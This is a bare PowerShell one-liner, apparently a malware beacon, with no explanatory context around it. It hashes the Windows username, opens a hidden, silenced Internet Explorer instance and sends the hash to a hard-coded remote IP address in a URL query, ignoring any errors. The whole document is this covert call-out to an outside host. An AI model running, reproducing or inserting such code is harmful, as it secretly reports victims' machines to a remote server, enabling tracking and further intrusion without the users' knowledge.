
$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider;$username = ls Env:USERNAME | select -exp Value;$usernameHash = [System.BitConverter]::ToString($sha1.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($username))) -replace "-","";$ie = New-Object -ComObject InternetExplorer.Application;$ie.Visible = $false;$ie.Silent = $true;$h = "212.83.186.207";$url = "http://" + $h;$infos = $usernameHash;$brFlgs = 14;try {;$ie.Navigate2($url + "?i=" + $infos, $brFlgs, 0);While ($ie.Busy -and $ie.ReadyState -ne 4) {;Start-Sleep -Milliseconds 400;};} catch {;};$ie.Quit();

